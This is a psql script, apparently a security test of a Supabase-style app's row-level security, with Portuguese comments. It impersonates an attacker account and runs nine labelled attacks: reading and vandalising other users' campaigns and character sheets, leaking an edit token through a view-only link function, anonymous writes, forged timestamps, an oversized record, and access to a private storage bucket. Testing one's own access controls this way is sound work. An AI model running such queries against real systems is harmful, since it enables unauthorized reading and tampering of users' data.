\set ON_ERROR_STOP 0
\pset footer off
set role authenticated;
select set_config('request.jwt.claims','{"sub":"00000000-0000-0000-0000-00000000000c","email":"atacante@x.com","role":"authenticated"}',false) \g /dev/null
\echo '== A1: atacante lê campanha alheia (código de convite e notas)'
select data->>'invite_code' as codigo, data->>'notas_secretas' as notas from records where entity='Campanha';
\echo '== A2: atacante vandaliza campanha alheia'
update records set data = data || '{"title":"HACKED","members":[]}' where id='22222222-2222-2222-2222-222222222222';
\echo '== A3: atacante cria campanha própria apontando para a ficha da vítima'
insert into records(entity,data,created_by) values ('Campanha','{"title":"isca","master_email":"atacante@x.com","members":[{"user_email":"atacante@x.com","character_id":"11111111-1111-1111-1111-111111111111"}]}','atacante@x.com');
\echo '== A4: atacante lê e edita a ficha da vítima'
select data->>'name' as ficha_lida from records where id='11111111-1111-1111-1111-111111111111';
update records set data = data || '{"name":"ROUBADA"}' where id='11111111-1111-1111-1111-111111111111';
\echo '== A5: link SÓ DE VER vaza o token de EDIÇÃO e o e-mail do dono (anon)'
set role anon; select set_config('request.jwt.claims','{"role":"anon"}',false) \g /dev/null
select data->>'edit_token' as edit_token_vazado, created_by as email_dono from character_by_token('VIEWTOKEN123456789');
\echo '== A6: anon chama função de escrita'
select update_character_with_token('11111111-1111-1111-1111-111111111111','EDITTOKEN987654321','{"lore":"anon editou"}');
set role authenticated; select set_config('request.jwt.claims','{"sub":"00000000-0000-0000-0000-00000000000c","email":"atacante@x.com","role":"authenticated"}',false) \g /dev/null
\echo '== A7: atacante falsifica created_date (fura limite de tempo)'
insert into records(entity,data,created_by,created_date) values ('Character','{"name":"x"}','atacante@x.com','2000-01-01') returning created_date;
\echo '== A8: atacante grava registro gigante (5 MB)'
insert into records(entity,data,created_by) values ('Character', jsonb_build_object('lixo', repeat('A', 5000000)),'atacante@x.com') returning octet_length(data::text) as bytes;
\echo '== A9: atacante envia arquivo para o bucket privado e lista arquivos dos outros'
insert into storage.objects(bucket_id,name,owner_id) values ('private','evil.html','00000000-0000-0000-0000-00000000000c');
reset role; insert into storage.objects(bucket_id,name,owner_id) values ('private','segredo-do-adm.pdf','00000000-0000-0000-0000-00000000000a');
set role authenticated;
select name as arquivo_listado from storage.objects where bucket_id='private';
reset role;
\echo '== Estado final da ficha da vítima:'
select data->>'name' as nome, data->>'lore' as lore from records where id='11111111-1111-1111-1111-111111111111';
select data->>'title' as campanha from records where id='22222222-2222-2222-2222-222222222222';
